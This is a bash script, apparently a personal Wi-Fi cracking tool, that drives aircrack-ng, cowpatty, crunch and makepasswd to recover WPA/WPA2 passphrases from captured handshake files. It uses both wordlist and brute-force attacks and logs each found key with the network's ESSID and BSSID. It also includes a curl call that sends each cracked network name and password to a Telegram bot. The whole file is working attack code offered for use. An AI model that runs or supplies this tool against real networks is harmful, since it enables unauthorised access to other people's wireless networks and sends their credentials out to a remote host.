#!/bin/bash

# ══ Regular color ════════╗ START ╔═
    BK=$(tput setaf 232)  # Black
    GY=$(tput setaf 246)  # Gray
    RD=$(tput setaf 160)  # Red
    GR=$(tput setaf 46)   # Green
    YW=$(tput setaf 226)  # Yellow
    OR=$(tput setaf 208)  # Orange
    BL=$(tput setaf 80)   # Blue
    MG=$(tput setaf 129)  # Magenta
    PR=$(tput setaf 198)  # Purple
    CY=$(tput setaf 14)   # Cyan
    WH=$(tput setaf 15)   # White
    NM=$(tput sgr0)       # Norm
    BD=$(tput bold)       # Bold
    BG=$(tput setab 3)    # Background Color
# ══ Regular color ════════╝  END  ╚═

# ══ Move cursor ════════╗ START ╔═
    SVC=$(tput sc)      # save position
    RSC=$(tput rc)      # restore position
    NRC=$(tput cnorm)   # back position to norm
    UPC=$(tput cuu1)    # up position 1 line
    DWC=$(tput cud1)    # down position 1 line
    LFC=$(tput cub1)    # left position 1 line
    RGC=$(tput cuf1)    # right position 1 line
    CL1=$(tput el)      # clean line <==|
    CL2=$(tput el1)     # clean line |==>
# ══ Move cursor ════════╝  END  ╚═

#╔═╗ VAR ╔════════════════════════════════════╗ START ╔════╗ */
  EnterCap=${1}
  ApiBot=`cat /${USER}/MyScript/setting/telegrambot | grep "api_key" | awk -F ' ' '{print $2}'`
  Chat_id=`cat /${USER}/MyScript/setting/telegrambot | grep "id_chat" | awk -F ' ' '{print $2}'`
#╚═╝ VAR ╚════════════════════════════════════╝  END  ╚════╝ */

#╔══════════════════════════════════════════════╗
#║  Verify the folder of Temporary files
#╚══════════════════════════════════════════════╝
  GCrack_FOLDER="GCrack$(date "+%T" | tr -d ":")"
  Temp_GCrack="/tmp/${GCrack_FOLDER}"
  Dir=`ls /tmp | grep -E ^${GCrack_FOLDER}$`
    if [ "$Dir" != "" ];then
      rm -rf ${Temp_GCrack}
      mkdir ${Temp_GCrack}
    else
      mkdir ${Temp_GCrack}
    fi
#╚══════════════════════════════  End Function ═╝

#╔══════════════════════════════════════════════╗
#║  Exit and Clear temp files
#╚══════════════════════════════════════════════╝
  FUNC_Exit() {
    clear
    echo -e ""
    killall -9 aircrack-ng &>/dev/null
    echo ""
    echo -e "${NM}${WH} [${NM}${RD}!${NM}${WH}] Stoped cracking."
    echo ""
    echo -e "${NM}${WH} [${NM}${RD}!${NM}${WH}] Remove temporary file ."
    rm -rf ${Temp_GCrack}
    sleep 1
    echo ""
    exit
  }
#╚══════════════════════════════  End Exit and Clear temp files ═╝

#╔══════════════════════════════════════════════╗
#║  Folder for rezult
#╚══════════════════════════════════════════════╝
  Dir_Result=`ls /${USER}/MyOUTPUT | grep -E wifi`
    if [ "$Dir_Result" == "" ];then
      mkdir /${USER}/MyOUTPUT/wifi
    fi
  File_Result=`ls /${USER}/MyOUTPUT/wifi | grep -E WIFI_PASS`
    if [ "$File_Result" == "" ];then
      echo -e " date, essid, bssid, password, pin" > /${USER}/MyOUTPUT/wifi/WIFI_PASS.txt
    fi
#╚══════════════════════════════  End Folder for rezult ═╝

# ══ Function for checking the installation and installing ════════╗ START ╔═
    FUNC_check_install() {
      ChInst="N"
      Chk=`dpkg-query -W -f='${status}' ${ChSoft} 2>/dev/null | grep "install ok installed"`
      if [[ -n "$Chk" ]]
          then
              ChInst="Y"
          else
              ChInst="N"
      fi
   }
# ══ Function for checking the installation and installing ════════╝  END  ╚═

#╔══════════════════════════════════════════════╗
#║  output % cracking
#╚══════════════════════════════════════════════╝
  FUNC_get_procen()
    {
      PID_search=$(ps | grep $Aircrack_PID)
      echo -en "${SVC}"
      while [[ -n "$PID_search" ]]
        do
          WORK=`tail -n 7 ${Temp_GCrack}/tempory.txt | grep -a -o "[0-9]*\.[0-9]*\%" | tail -1`
          if [ -n "$WORK" -a "$WORK" != "$SU" ];
            then
              SU="$WORK"
              TOSTATUS="${BD}${WH} Cracking ${BD}${CY}${T}${NM}${YW}/${BD}${CY}${K} ${NM}${PR}>>  ${BD}${YW}${SU} "
              rc_rh_tr="\e[8C"
              echo -en "${RSC}${rc_rh_tr}${TOSTATUS}"
          fi
          PID_search=$(ps | grep $Aircrack_PID)
          KEY=$(tail -n 3 ${Temp_GCrack}/tempory.txt | grep -o 'FOUND.*\[.*\]' | sort -u | awk '{print $3}')
      done
      if [[ -z "$KEY" ]];
        then
          echo -e "${RSC}        ${BD}${WH} Cracking status ${NM}${PR} >>   ${BD}${YW}100.00%"
        else
          echo -e ""
      fi
    }
#╚══════════════════════════════  End output % cracking ═╝

#╔══════════════════════════════════════════════╗
#║  Create table
#╚══════════════════════════════════════════════╝
  FUNC_create_tabl() {
    max_lf=""
    max_rh=""
    S=${#WORD}
    let IZ=${S}%2
    MIN=$((($MAX-$S)/2))
    for (( STIND=0;STIND<${MIN};STIND++))
        do
          max_lf=${max_lf}' '
    done
    if [ $IZ == 0 ]
      then
        for (( STIND=0;STIND<${MIN};STIND++))
            do
              max_rh=${max_rh}' '
        done
      else
        for (( STIND=0;STIND<=${MIN};STIND++))
            do
              max_rh=${max_rh}' '
        done
    fi
  }
#╚══════════════════════════════  End Create table ═╝

#╔══════════════════════════════════════════════╗
#║  Set tittle attack
#╚══════════════════════════════════════════════╝
  FUNC_set_title ()
    {
      # clear
      test_speed=$(aircrack-ng -S > ${Temp_GCrack}/speed.txt) &
      sleep 1s
      spd=$(cat ${Temp_GCrack}/speed.txt | awk -F '.' '{print $1}' | tail -1)
      ASD=$(aircrack-ng ${CAPFILE} -w ${dict} &> ${Temp_GCrack}/tempory.txt) &
      Aircrack_PID="$!"
      disown $Airodump_PID
      sleep 2
      kill -9 $Aircrack_PID 2> /dev/null
      line=$(tail -n 5 ${Temp_GCrack}/tempory.txt | grep -o "\/.*keys" | grep -o [0-9]* | tail -1)
      if [[ -z "$line" ]];
        then
          line=$(wc -l $dict 2>/dev/null | grep -o -E '[[:digit:]]{1,} /' | grep -o -E '[[:digit:]]{1,}')
      fi
      use_time=$(echo $[$line/$spd])
      tm=$(date +'('%d%B')'%H:%M)
      tm2=$(date --date "+$use_time sec" +'('%d%B')'%H:%M)
      echo -e " ${NM}${YW}|===========================================|"
      echo -e " ${NM}${YW}| ${BD}${BL}TARGET     ${NM}${CY}>>  ${BD}${WH}${ESSID}"
      echo -e " ${NM}${YW}| ${BD}${BL}DICT       ${NM}${CY}>>  ${BD}${WH}$dict "
      echo -e " ${NM}${YW}| ${BD}${BL}START      ${NM}${CY}>>  ${BD}${RD}$tm"
      echo -e " ${NM}${YW}| ${BD}${BL}END        ${NM}${CY}>>  ${NM}$tm2"
      echo -e " ${NM}${YW}| ${BD}${BL}PASSWORDS  ${NM}${CY}>>  ${BD}${WH}$line"
      echo -e " ${NM}${YW}| ${BD}${BL}SPEED      ${NM}${CY}>>  ${BD}${WH}$spd k/s"
      echo -e " ${NM}${YW}|===========================================|"
    }
#╚══════════════════════════════  End Set tittle attack ═╝

#╔══════════════════════════════════════════════╗
#║  Save Password on file
#╚══════════════════════════════════════════════╝
  FUNC_set_header_wr ()
    {
      ITDATE=`date +%d-%m-%Y`
      echo -e " $ITDATE, $ESSID, $BSSID, $KEY, " >> /${USER}/MyOUTPUT/wifi/WIFI_PASS.txt
    }
#╚══════════════════════════════  End Save Password on file ═╝

#╔══════════════════════════════════════════════╗
#║  Print found PASS
#╚══════════════════════════════════════════════╝
  FUNC_set_success ()
    {
      echo -e " ${BD}${GR}|===============|"
      echo -e " ${BD}${GR}|   ${NM}KEY FOUND   ${BD}${GR}| ${NM}${CY}>>  ${BD}${WH}${KEY}"
      echo -e " ${BD}${GR}|===============|"
      echo -e ""
      if [[ -n ${ApiBot} && -n ${Chat_id} ]]
        then
          MSGBOT="WIFI hacked -> ${ESSID} : ${KEY}"
          SENDTOBOT=`curl -s "https://api.telegram.org/${ApiBot}/sendMessage?chat_id=${Chat_id}&text=${MSGBOT}" &>/dev/null`
      fi  
    }
#╚══════════════════════════════  End Print found PASS ═╝

#╔══════════════════════════════════════════════╗
#║  Print Pass not found
#╚══════════════════════════════════════════════╝
FUNC_set_fail ()
  {
    echo -e " ${NM}${RD}|===========================================|"
    echo -e " ${NM}${RD}|        ${BD}${RD}-= KEY NOT FOUND, SORRY! =-        ${NM}${RD}|"
    echo -e " ${NM}${RD}|===========================================|"
  }
#╚══════════════════════════════  End Print Pass not found ═╝

FUNC_clean_up()
  {
    killall -9 aircrack-ng
    echo -en "\n Stoped process... back MENU"
  }

#╔══════════════════════════════════════════════╗
#║  Select passlist
#╚══════════════════════════════════════════════╝
  FUNC_select_to_pass() {
    if [[ -n ${EnterCap} ]]
      then
        find /${USER}/MyScript/dic -name '*' -printf "%f  %s %p\n" | sort -k2,2n | awk -F ' ' '{print $3}' > ${Temp_GCrack}/file_pass.txt
        echo '' > "${Temp_GCrack}/randompasswords.txt"
        echo "${Temp_GCrack}/randompasswords.txt" >> ${Temp_GCrack}/file_pass.txt
        cat ${Temp_GCrack}/file_pass.txt > ${Temp_GCrack}/select_pas_list.txt
      else
        clear
          echo -e "${BD}${CY}|===========================================|"
          echo -e "${BD}${CY}|         ${NM}${YW}SELECT PASSWORDLIST FILE          ${BD}${CY}|"
          echo -e "${BD}${CY}|===========================================|"
          echo -e "${NM}${WH}"
          find /${USER}/MyScript/dic -name '*' -printf "%f  %s %p\n" | sort -k2,2n | awk -F ' ' '{print $3}' > ${Temp_GCrack}/file_pass.txt
          echo '' > "${Temp_GCrack}/randompasswords.txt"
          echo "${Temp_GCrack}/randompasswords.txt" >> ${Temp_GCrack}/file_pass.txt
          N=1
          while read PASFILE
            do
              PFILE=`echo "$PASFILE" | awk -F "/" '{print $NF}'`
              PSIZE=`du -b "${PASFILE}" --block-size=M | head -n1 | awk '{print $1}'`
              STARt="${N}${PFILE}"
              WORD=$STARt
              MAX="32"
              FUNC_create_tabl
              echo -e "  ${NM}${WH}${N}${NM}${RD}) ${NM}${WH}${PFILE}${max_lf}${max_rh}${BD}${YW}${PSIZE}"
              N=$(($N+1))
          done < ${Temp_GCrack}/file_pass.txt
          echo ""
          echo -e "${BD}${CY}|===========================================|"
          echo ""
          echo -en "${NM}${GR} ENTER Number passlist ${NM}${RD}[${NM}${WH}e.g.: ${NM}${CY}1,2,6 or ${BD}${RD}all${NM}${RD}]${NM}${PR}>> ${BD}${RD}"
          read NUM
          if [[ "$NUM" == "all" || -z "${NUM}" ]];
                then
                  cat ${Temp_GCrack}/file_pass.txt > ${Temp_GCrack}/select_pas_list.txt
                else
                  echo "${NUM}" | tr "," "\n" | sed 's/[^0-9]//g' > ${Temp_GCrack}/select_num_pas_list.txt
                  echo -en "" > ${Temp_GCrack}/select_pas_list.txt
                  while read NUMPASFILE
                    do
                      DICTMP=$(sed -n "${NUMPASFILE}{p;q;}" ${Temp_GCrack}/file_pass.txt)
                      echo -e "$DICTMP" >> ${Temp_GCrack}/select_pas_list.txt
                  done < ${Temp_GCrack}/select_num_pas_list.txt
          fi
          clear
    fi      
  }
#╚══════════════════════════════  End Select passlist ═╝

#╔══════════════════════════════════════════════╗
#║  Select Handshake file
#╚══════════════════════════════════════════════╝
  FUNC_select_to_crack() {
    if [[ -n ${EnterCap} ]]
      then
        echo -e ${EnterCap} > ${Temp_GCrack}/file_cap.txt
        echo -e ${EnterCap} > ${Temp_GCrack}/select_cap_list.txt
      else
        clear
          echo -e "${BD}${CY}|===========================================|"
          echo -e "${BD}${CY}|        ${NM}${YW}SELECT SPECIFY TO THE *.cap        ${BD}${CY}|"
          echo -e "${BD}${CY}|===========================================|"
          echo -e "${NM}${WH}"
          find ~ -name '*.cap' | sort -k3 > ${Temp_GCrack}/file_cap.txt
          N=1
          while read Y
            do
              CFILE=`echo ${Y} | awk -F "/" 'END {print $(NF-1), $NF}'`
              echo -e " ${NM}${WH}${N}${NM}${RD}) ${NM}${WH}${CFILE}"
              N=$(($N+1))
          done < ${Temp_GCrack}/file_cap.txt
          echo ""
          echo -e "${BD}${CY}|===========================================|"
          echo ""
          echo -en "${NM}${GR} ENTER Number ${NM}${RD}[${NM}${WH}e.g.: ${NM}${CY}1,2,6 or ${BD}${RD}all${NM}${RD}]${NM}${PR} >> ${BD}${RD}"
          read num
          if [[ "$num" == "all" ]];
                then
                  cp ${Temp_GCrack}/file_cap.txt ${Temp_GCrack}/select_cap_list.txt
                else
              echo "${num}" | tr "," "\n" | sed 's/[^0-9]//g' > ${Temp_GCrack}/select_num_cap_list.txt
              echo -en "" > ${Temp_GCrack}/select_cap_list.txt
              while read NUMCAPFILE
                do
                  CAPFILE=$(sed -n "${NUMCAPFILE}{p;q;}" ${Temp_GCrack}/file_cap.txt)
                  echo -e "$CAPFILE" >> ${Temp_GCrack}/select_cap_list.txt
              done < ${Temp_GCrack}/select_num_cap_list.txt
          fi
      fi  
  }
#╚══════════════════════════════  End Select Handshake file ═╝

#╔══════════════════════════════════════════════╗
#║  Aircracking-ng
#╚══════════════════════════════════════════════╝
  FUNC_start_aircrack()
    {
      T=0
      K=`cat ${Temp_GCrack}/select_pas_list.txt | wc -l`
      while read dict
        do
          FUNC_set_title
          x=$(aircrack-ng -w ${dict} "${CAPFILE}" &> ${Temp_GCrack}/tempory.txt) &
          Aircrack_PID="$!"
          T=$(($T+1))
          FUNC_get_procen
          if [[ -n "$KEY" ]];
            then
              FUNC_set_success
              FUNC_set_header_wr
              # exit
            else
              FUNC_set_fail
          fi
      done < ${Temp_GCrack}/select_pas_list.txt
    }
#╚══════════════════════════════  End Aircracking-ng ═╝

#╔══════════════════════════════════════════════╗
#║  Back to menu
#╚══════════════════════════════════════════════╝
  FUNC_int_enter()
    {
      echo -en "\n Press Enter to continue"
      read
      clear
    }
#╚══════════════════════════════  End Back to menu ═╝

#╔═╗ Атака через crunched ╔════════════════════════════════════╗ START ╔════╗ */
  FUNC_crunched()
    {
      FUNC_select_to_crack
      st_time=$(date +'('%d%B')'%H:%M)
      echo -e " ${NM}${YW}|===========================================|"
      echo -e " ${NM}${YW}|    ${BD}${BL}STARTING   ${NM}${CY}>>  ${BD}${RD}$st_time"
      echo -e " ${NM}${YW}|===========================================|"
      x=$(crunch 8 10 mixalpha-numeric-space -d 2@% 2>/dev/null | aircrack-ng -w- -b $BSSID ${CAPFILE} &> ${Temp_GCrack}/tempory.txt) &
      Aircrack_PID="$!"
      FUNC_get_procen
      if [[ -n "$KEY" ]];
        then
          FUNC_set_success
          FUNC_set_header_wr
          exit
        else
          FUNC_set_fail
      fi
    }
#╚═╝ Атака через FUNC_crunched ╚════════════════════════════════════╝  END  ╚════╝ */

#╔═╗ Запуск атаки ╔════════════════════════════════════╗ START ╔════╗ */
  FUNC_attacked()
    {
      FUNC_select_to_crack
      FUNC_select_to_pass
      ChSoft='makepasswd'
      FUNC_check_install
      if [ ${ChInst} == "Y" ]
        then
          makepasswd -count ${GENPASS} > ${Temp_GCrack}/randompasswords.txt &
      fi
      while read CAPFILE
        do
          ChSoft='cowpatty'
          NoTest1='N'
          FUNC_check_install
          if [ ${ChInst} == "Y" ]
            then
              TEST1=`cowpatty -c -r ${CAPFILE} | grep "Collected all necessary data to mount crack against WPA2/PSK passphrase"`
            else
              NoTest1='Y'
          fi
          TEST2=`aircrack-ng ${CAPFILE} | grep "1 handshake"`
          if [ -n "$TEST1" -a -n "$TEST2" ] || [ -n "$TEST2" -a "${NoTest1}" == "Y" ];
            then
              # clear
              BSSID=$(aircrack-ng $CAPFILE | grep WPA  | awk -F' '  '{print $2}' 2> /dev/null)
              ESSID=$(aircrack-ng $CAPFILE | grep WPA  | awk -F' '  '{print $3}' 2> /dev/null)
              find_file=$(ls /${USER}/MyOUTPUT/wifi/ | grep WIFI_PASS.txt)
              if [[ -n "$find_file" ]];
                then
                  echo ""
                  LAST_KEY=$(grep $BSSID /${USER}/MyOUTPUT/wifi/WIFI_PASS.txt | awk -F "," '{print $4}' | sed 's/ //g' | sort -u)
                  if [[ -n "$LAST_KEY" ]];
                    then
                      echo -e "$LAST_KEY" > /${Temp_GCrack}/test_last_key.txt
                      KEY=$(aircrack-ng -w /${Temp_GCrack}/test_last_key.txt "${CAPFILE}" | grep -o 'FOUND.*\[.*\]' | sort -u | awk '{print $3}')
                      if [[ -n "$KEY" ]];
                        then
                          echo ""
                          echo -e "  ${BD}${WH} TARGET ${NM}${PR}>>  ${BD}${YW}${ESSID}"
                          echo -e "  ${BD}${WH} MAC    ${NM}${PR}>>  ${BD}${YW}${BSSID}"
                          echo -e ""
                          FUNC_set_success
                          # exit
                        else
                          FUNC_start_aircrack
                      fi
                    else
                      FUNC_start_aircrack
                  fi
                else
                  FUNC_start_aircrack
              fi
            else
              # echo -e "  ${BD}${WH} BAD Handshake, change Target!"
              rm -rf ${CAPFILE}
          fi
      done < ${Temp_GCrack}/select_cap_list.txt
    }
#╚═╝ Запуск атаки ╚════════════════════════════════════╝  END  ╚════╝ */

#╔══════════════════════════════════════════════╗
#║  Install makepasswd
#╚══════════════════════════════════════════════╝
FUNC_set_makepasswd()
    {
      if [[ -n ${EnterCap} ]]
        then
          GENPASS='500000'
        else
          clear
          echo -e ""
          echo -en "${NM}${WH}  [${NM}${RD}!${NM}${WH}] ${NM}Specify the number of generated passwords [${NM}${RD}500000${NM}${CY}/${NM}${WH}n${NM}] ${BD}${CY}> ${BD}${RD}"
          read GENPASS
          if [[ -n "$GENPASS" && "$GENPASS" -gt "1" ]];
            then
              GENPASS=$GENPASS
            else
              GENPASS="500000"
          fi
          inf=`dpkg -s makepasswd | grep -w "Status: install ok installed"`
          if [[ -z "$inf" ]];then
              apt-get install makepasswd 2> /dev/null
            else
              echo -e ""
          fi
      fi    
    }
#╚══════════════════════════════  End Install makepasswd ═╝

#╔══════════════════════════════════════════════╗
#║  Basic functions
#╚══════════════════════════════════════════════╝
  trap FUNC_Exit SIGINT
  clear
  ChSoft='makepasswd'
  FUNC_check_install
  if [ ${ChInst} == "Y" ]
    then
      FUNC_set_makepasswd
  fi
  clear
  echo -e ""
  if [[ -n ${EnterCap} ]]
    then
      FUNC_attacked
      FUNC_int_enter
    else
      selecti=
      until [[ "selecti" = "0" ]]; do
          echo -e " ${BD}${CY}|===========================================|"
          echo -e " ${BD}${CY}|                   ${NM}${YW}MENU                    ${BD}${CY}|"
          echo -e " ${BD}${CY}|===========================================|"
          echo -e "${NM}${WH}  +${NM}${CY}-----------------------------------------${NM}${WH}+"
          echo -e "  ${NM}${CY}|${NM}${WH} [${NM}${RD}1${NM}${WH}] ${BD}${CY} >  ${NM}${BL}Aircracking-ng                  ${NM}${CY}|"
          echo -e "  ${NM}${CY}|${NM}${WH} [${NM}${RD}2${NM}${WH}] ${BD}${CY} >  ${NM}${BL}Use the ${NM}${GR}Crunch                  ${NM}${CY}|"
          echo -e "  ${NM}${CY}|                                         ${NM}${CY}|"
          echo -e "  ${NM}${CY}|${NM}${WH} [${NM}${RD}0${NM}${WH}] ${BD}${CY} >  ${NM}${BL}Exit                            ${NM}${CY}|"
          echo -e "${NM}${WH}  +${NM}${CY}-----------------------------------------${NM}${WH}+"
          echo -e " ${BD}${CY}|===========================================|"
          echo ""
        echo -en " ${NM}${GR}Enter number menu${NM}${WH}: ${BD}${RD}"
        read selecti
        case $selecti in
          1 ) FUNC_attacked ; FUNC_int_enter ;;
          2 ) FUNC_crunched ; FUNC_int_enter ;;
          0 ) clear ; FUNC_Exit ;;
          * ) clear ; FUNC_attacked ; FUNC_int_enter ;;
        esac
      done
  fi
#╚══════════════════════════════  End Basic functions ═╝
